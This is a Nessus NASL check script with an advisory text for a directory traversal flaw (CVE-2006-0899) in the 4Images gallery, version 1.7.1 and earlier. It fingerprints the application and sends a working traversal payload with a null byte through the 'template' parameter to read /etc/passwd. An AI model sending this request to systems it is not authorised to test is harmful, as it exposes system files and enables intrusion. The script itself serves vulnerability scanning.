#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#
# Original advisory / discovered by : 
# http://retrogod.altervista.org/4images_171_incl_xpl.html
#

if (description) {
 script_id(21020);
 script_version("$Revision: 1.2 $");

 script_cve_id("CVE-2006-0899");
 script_bugtraq_id(16855);

 name["english"] = "4Images <= 1.7.1 Directory Traversal Vulnerability";
 script_name(english:name["english"]);
 desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to
directory traversal attacks. 

Description :

4Images is installed on the remote system.  It is an image gallery
management system. 

The installed application does not validate user-input passed in the
'template' variable of the 'index.php' file.  This allows an attacker
to execute directory traversal attacks and display the content of
sensitive files on the system and possibly to execute arbitrary PHP
code if he can write to local files through some other means. 

See also :

http://www.4homepages.de/forum/index.php?topic=11855.0
http://secunia.com/advisories/19026/

Solution :

Upgrade to 4Images version 1.7.2 or sanitize the 'index.php' file as
advised by a forum post (see first URL). 

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
 script_description(english:desc["english"]);
 summary["english"] = "Check if 4Images is vulnerable to directory traversal flaws";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/4images", "/gallery", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port); 
 if(res == NULL) exit(0);

 if (egrep(pattern:"Powered by.+4images", string:res)) {
 
  file = "../../../../../../../../etc/passwd";
  req = http_get(item:string(dir, "/index.php?template=", file, "%00"), port:port);

  recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
  if (recv == NULL) exit(0);

  if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
   security_hole(port);
   exit(0); 
  } 
 }
}
